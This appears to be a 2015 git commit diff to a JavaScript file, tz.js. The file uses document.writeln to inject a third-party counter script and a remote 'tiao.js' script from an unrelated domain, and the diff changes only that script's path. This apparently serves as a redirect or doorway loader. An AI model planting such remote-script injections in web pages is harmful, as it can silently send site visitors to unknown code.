d801ea45cd0e895559701b93fce65dc8a31bc167
js88888888 <jsjsjs888@outlook.com>
2015-11-19 10:58:31 +0800

    Update tz.js

--- dfzq1/3/tz.js
+++ dfzq1/3/tz.js
@@ -1,4 +1,4 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=386073564&logo=12\" charset=\"gb2312\"><\/script>");
 
 
-document.writeln("<script src=http:\/\/\www.bvb999.com\/dflh1/tiao.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.bvb999.com\/dfzq1/tiao.js ><\/script>");
